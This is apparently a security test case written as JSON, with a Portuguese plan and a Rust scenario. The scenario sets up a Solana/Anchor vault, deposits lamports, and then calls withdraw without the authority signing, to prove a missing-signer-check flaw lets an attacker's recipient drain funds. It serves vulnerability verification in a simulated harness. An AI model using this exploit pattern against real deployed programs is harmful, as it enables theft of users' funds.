{
  "plan": "Preparo o vault PDA com seeds [b"vault", authority.key()] e a conta authority (Signer) via initialize, depois deposito lamports no vault com deposit. O uso legitimo de withdraw inclui a authority como signer. No ataque, chamo withdraw com a mesma authority mas sem marca-la como signer, e um recipient controlado pelo atacante. O efeito mede que os lamports do vault diminuíram e os do recipient aumentaram sem a assinatura da authority.",
  "scenario": "let authority = Pubkey::new_unique();
let recipient = Pubkey::new_unique();
let (vault_pda, _bump) = Pubkey::find_program_address(&[b"vault", authority.as_ref()], &env.program_id);

// Baseline: initialize cria o vault
let ix_init = env.anchor_ix("initialize", &(), &[
    AccountMeta::new(vault_pda, false),
    AccountMeta::new(authority, true),
    AccountMeta::new_readonly(solana_program::system_program::id(), false),
]);
let contas_init = vec![
    (vault_pda, empty_account()),
    (authority, wallet(1_000_000_000)),
    system_program_account(),
];
let r_init = env.baseline("initialize vault", &ix_init, &contas_init);

// Baseline: deposit para dar saldo ao vault
let ix_dep = env.anchor_ix("deposit", &(&500_000_000u64,), &[
    AccountMeta::new(vault_pda, false),
    AccountMeta::new(authority, true),
    AccountMeta::new_readonly(solana_program::system_program::id(), false),
]);
let contas_dep = vec![
    (vault_pda, after(&r_init, &vault_pda).clone()),
    (authority, after(&r_init, &authority).clone()),
    system_program_account(),
];
let r_dep = env.baseline("deposit into vault", &ix_dep, &contas_dep);

// Ataque: withdraw sem a authority assinar
let ix_atk = env.anchor_ix("withdraw", &(&100_000_000u64,), &[
    AccountMeta::new(vault_pda, false),
    AccountMeta::new_readonly(authority, false), // NAO assina
    AccountMeta::new(recipient, false),
]);
let contas_atk = vec![
    (vault_pda, after(&r_dep, &vault_pda).clone()),
    (authority, after(&r_dep, &authority).clone()),
    (recipient, wallet(0)),
];
let r_atk = env.attack("withdraw sem assinatura da authority", &ix_atk, &contas_atk);

if r_atk.program_result == ProgramResult::Success {
    let vault_lamports = after(&r_atk, &vault_pda).lamports();
    let recipient_lamports = after(&r_atk, &recipient).lamports();
    env.effect("vault perdeu lamports sem assinatura da authority", vault_lamports < after(&r_dep, &vault_pda).lamports());
    env.effect("recipient ganhou lamports sem assinatura da authority", recipient_lamports > 0);
}"
}

